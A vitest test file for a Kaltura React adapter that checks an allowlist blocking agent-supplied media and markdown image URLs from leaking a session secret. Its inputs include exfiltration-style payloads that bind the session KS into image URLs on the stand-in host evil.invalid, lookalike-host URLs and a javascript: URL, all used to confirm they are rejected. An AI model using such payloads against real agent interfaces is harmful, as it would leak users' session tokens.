// Covers: SEC-05 (a KS in the data model combined with a basic Image, Video or
// AudioPlayer URL). Plan item 3.1: buildKalturaCatalog restricts their `url` to
// Kaltura hosts plus origins the host adds with setExtraMediaOrigins.
import { describe, it, expect, vi, afterEach } from 'vitest';
import { act } from 'react';
import {
  buildKalturaCatalog,
  kalturaReactCatalog,
  setErrorHandler,
  setExtraMediaOrigins,
  type KalturaError,
} from '../../src/adapters/react/index';
import { isAllowedMediaUrl } from '../../src/core/media-url';
import { basicCatalog } from '@a2ui/react/v0_9';
import { renderMarkdown } from '@a2ui/markdown-it';
import { renderSurface, type SurfaceOptions } from './surface-helper';

const KS = 'SECRET_KS_VALUE';
const KALTURA_IMG = 'https://cfvod.kaltura.com/p/1/thumbnail/entry_id/0_abc/width/200';
const FOREIGN = 'https://evil.invalid/pixel.png';
const MEDIA = [
  ['Image', 'img', 'image'],
  ['Video', 'video', 'video'],
  ['AudioPlayer', 'audio', 'audio-player'],
] as const;

let mounted: Array<{ root: { unmount(): void } }> = [];

afterEach(() => {
  for (const m of mounted) act(() => m.root.unmount());
  mounted = [];
  document.body.innerHTML = '';
  setExtraMediaOrigins([]);
  setErrorHandler(undefined);
  vi.restoreAllMocks();
});

async function show(component: string, url: unknown, dataModel?: Record<string, unknown>, catalog = buildKalturaCatalog(), options?: SurfaceOptions) {
  const view = await renderSurface(catalog, [{ id: 'root', component, url }], dataModel, options);
  mounted.push(view);
  return view;
}

/** Every src or URL-looking attribute in the host. */
const sources = (host: Element) =>
  [...host.querySelectorAll('*')].flatMap(el => [...el.attributes].filter(a => /src|href|poster/.test(a.name)).map(a => a.value));

describe('SEC-05: isAllowedMediaUrl', () => {
  it.each([
    ['a Kaltura CDN URL', KALTURA_IMG, true],
    ['a foreign https URL', FOREIGN, false],
    ['http on a Kaltura host', KALTURA_IMG.replace('https', 'http'), false],
    ['a lookalike host', 'https://kaltura.com.evil.invalid/x.png', false],
    ['userinfo', 'https://user:pw@cfvod.kaltura.com/x.png', false],
    ['a port', 'https://cfvod.kaltura.com:8443/x.png', false],
    ['a data URL', 'data:image/png;base64,AAAA', false],
    ['a javascript URL', 'javascript:alert(1)', false],
    ['a relative URL', '/x.png', false],
    ['the API on a Kaltura host', 'https://www.kaltura.com/api_v3/service/media/action/list', false],
    ['an encoded API path', 'https://www.kaltura.com/%61pi_v3/service/media/action/list', false],
    ['the old API', 'https://www.kaltura.com/index.php/partnerservices2/x', false],
    ['a ks query parameter', `${KALTURA_IMG}?ks=${KS}`, false],
    ['a ks path segment', `https://cfvod.kaltura.com/p/1/ks/${KS}/x.png`, false],
    ['a non-string', { url: KALTURA_IMG }, false],
  ])('SEC-05: %s', (_name, url, allowed) => {
    expect(isAllowedMediaUrl(url)).toBe(allowed);
  });
});

describe.each(MEDIA)('SEC-05: basic %s url', (component, tag, widget) => {
  it(`SEC-05: ${component} renders a Kaltura CDN url`, async () => {
    const { host } = await show(component, KALTURA_IMG);
    expect(host.querySelector(tag)?.getAttribute('src')).toBe(KALTURA_IMG);
  });

  it(`SEC-05: ${component} renders nothing for a foreign url`, async () => {
    const { host } = await show(component, FOREIGN);
    expect([host.querySelector(tag), sources(host)]).toEqual([null, []]);
  });

  it(`SEC-05: ${component} with a bound ks in formatString loads nothing`, async () => {
    const url = { call: 'formatString', args: { value: `${FOREIGN}?k=\${/session/ks}` }, returnType: 'string' };
    const { host } = await show(component, url, { session: { ks: KS } });
    expect([host.querySelector(tag), host.innerHTML.includes(KS)]).toEqual([null, false]);
  });

  it(`SEC-05: ${component} with a bound ks into a Kaltura host loads nothing`, async () => {
    const url = { call: 'formatString', args: { value: `${KALTURA_IMG}?ks=\${/session/ks}` }, returnType: 'string' };
    const { host } = await show(component, url, { session: { ks: KS } });
    expect([host.querySelector(tag), host.innerHTML.includes(KS)]).toEqual([null, false]);
  });

  it(`SEC-05: ${component} with a url bound to the data model is checked`, async () => {
    const { host } = await show(component, { path: '/media/url' }, { media: { url: FOREIGN } });
    expect(host.querySelector(tag)).toBeNull();
  });

  it(`SEC-05: ${component} checks the url again when the data model changes`, async () => {
    const view = await show(component, { path: '/media/url' }, { media: { url: KALTURA_IMG } });
    await view.update('/media/url', FOREIGN);
    expect(view.host.querySelector(tag)).toBeNull();
  });

  it(`SEC-05: ${component} renders a url on an origin from setExtraMediaOrigins`, async () => {
    setExtraMediaOrigins(['https://media.example.com']);
    const { host } = await show(component, 'https://media.example.com/a/b.png');
    expect(host.querySelector(tag)?.getAttribute('src')).toBe('https://media.example.com/a/b.png');
  });

  it(`SEC-05: ${component} reports url-rejected without the url`, async () => {
    const seen: KalturaError[] = [];
    setErrorHandler(e => seen.push(e));
    await show(component, `${FOREIGN}?k=${KS}`);
    expect(seen).toEqual([{ code: 'url-rejected', widget, message: `${component} url is not allowed` }]);
  });

  it(`SEC-05: ${component} with no url reports nothing`, async () => {
    const seen: KalturaError[] = [];
    setErrorHandler(e => seen.push(e));
    await show(component, '');
    expect(seen).toEqual([]);
  });

  it(`SEC-05: ${component} keeps rendering when the error handler throws`, async () => {
    setErrorHandler(() => {
      throw new Error('host bug');
    });
    const { host } = await show(component, FOREIGN);
    await show(component, KALTURA_IMG);
    expect([host.querySelector(tag), document.querySelectorAll(tag).length]).toEqual([null, 1]);
  });
});

describe('SEC-05: setExtraMediaOrigins', () => {
  it.each([['http://media.example.com'], ['https://media.example.com/path'], ['not a url']])(
    'SEC-05: refuses %s',
    origin => {
      expect(() => setExtraMediaOrigins([origin])).toThrow();
    },
  );

  it('SEC-05: a new list replaces the old one', () => {
    setExtraMediaOrigins(['https://media.example.com']);
    setExtraMediaOrigins(['https://other.example.com']);
    expect(isAllowedMediaUrl('https://media.example.com/a.png')).toBe(false);
  });

  it('SEC-05: an added origin still refuses a ks parameter', () => {
    setExtraMediaOrigins(['https://media.example.com']);
    expect(isAllowedMediaUrl(`https://media.example.com/a.png?ks=${KS}`)).toBe(false);
  });
});

describe('SEC-05: the shipped catalogs guard the basic media components', () => {
  it('SEC-05: kalturaReactCatalog renders no foreign Image', async () => {
    const { host } = await show('Image', FOREIGN, undefined, kalturaReactCatalog);
    expect(host.querySelector('img')).toBeNull();
  });

  it('SEC-05: other basic components are the basic catalog ones', () => {
    expect(buildKalturaCatalog().components.get('Button')).toBe(basicCatalog.components.get('Button'));
  });

  it.each([
    [FOREIGN, 0],
    [KALTURA_IMG, 1],
  ])('SEC-05: the legacy render path checks %s', async (url, count) => {
    const { ComponentContext, MessageProcessor } = await import('@a2ui/web_core/v0_9');
    const catalog = buildKalturaCatalog();
    const processor = new MessageProcessor([catalog]);
    processor.processMessages([
      { version: 'v0.9', createSurface: { surfaceId: 's', catalogId: catalog.id } },
      { version: 'v0.9', updateComponents: { surfaceId: 's', components: [{ id: 'root', component: 'Image', url }] } },
    ] as never);
    const context = new ComponentContext(processor.model.getSurface('s')!, 'root');
    const { createRoot } = await import('react-dom/client');
    const { createElement } = await import('react');
    const host = document.body.appendChild(document.createElement('div'));
    const root = createRoot(host);
    mounted.push({ root });
    await act(async () => root.render(createElement(catalog.components.get('Image')!.render, { context, buildChild: () => null })));
    expect(host.querySelectorAll('img').length).toBe(count);
  });
});

// 0.1.x told hosts to register basicCatalog next to the Kaltura catalog. The
// agent picks the catalog by id, so it could pick the plain basic one.
const BOTH: SurfaceOptions = { registered: [kalturaReactCatalog, basicCatalog] };

describe('SEC-05: a host that also registers basicCatalog', () => {
  it.each(MEDIA)('SEC-05: an agent that picks basicCatalog.id gets a guarded %s', async (component, tag) => {
    const { host } = await show(component, FOREIGN, undefined, basicCatalog, BOTH);
    expect([host.querySelector(tag), sources(host)]).toEqual([null, []]);
  });

  it('SEC-05: the guarded Image under basicCatalog.id still renders a Kaltura url', async () => {
    const { host } = await show('Image', KALTURA_IMG, undefined, basicCatalog, BOTH);
    expect(host.querySelector('img')?.getAttribute('src')).toBe(KALTURA_IMG);
  });
});

describe('SEC-05: basic Text markdown through the host renderer', () => {
  const bound = (value: string) => ({ call: 'formatString', args: { value }, returnType: 'string' });
  const text = (value: unknown, catalog = kalturaReactCatalog, options: SurfaceOptions = {}) =>
    renderSurface(catalog, [{ id: 'root', component: 'Text', text: value }], { session: { ks: KS } }, { markdown: renderMarkdown, ...options }).then(view => {
      mounted.push(view);
      return view.host;
    });

  it('SEC-05: a markdown image with a bound ks loads nothing', async () => {
    const host = await text(bound('![x](https://evil.invalid/p.png?d=${/session/ks})'));
    expect([host.querySelectorAll('img').length, host.innerHTML.includes(KS)]).toEqual([0, false]);
  });

  it('SEC-05: an agent that picks basicCatalog.id gets the same markdown filter', async () => {
    const host = await text(bound('![x](https://evil.invalid/p.png?d=${/session/ks})'), basicCatalog, BOTH);
    expect([host.querySelectorAll('img').length, host.innerHTML.includes(KS)]).toEqual([0, false]);
  });

  it('SEC-05: a Kaltura CDN markdown image still loads', async () => {
    const host = await text(`![x](${KALTURA_IMG})`);
    expect(host.querySelector('img')?.getAttribute('src')).toBe(KALTURA_IMG);
  });

  it('SEC-05: a markdown image on a setExtraMediaOrigins origin loads', async () => {
    setExtraMediaOrigins(['https://media.example.com']);
    const host = await text('![x](https://media.example.com/a.png)');
    expect(host.querySelector('img')?.getAttribute('src')).toBe('https://media.example.com/a.png');
  });

  it('SEC-05: bold, lists and safe links still render', async () => {
    const host = await text('**b**\n\n- one\n\n[web](https://example.com) [mail](mailto:a@example.com) [bad](javascript:alert(1))');
    const hrefs = [...host.querySelectorAll('a')].map(a => a.getAttribute('href'));
    expect([host.querySelector('strong')?.textContent, host.querySelector('li')?.textContent, hrefs]).toEqual([
      'b',
      'one',
      ['https://example.com', 'mailto:a@example.com'],
    ]);
  });
});
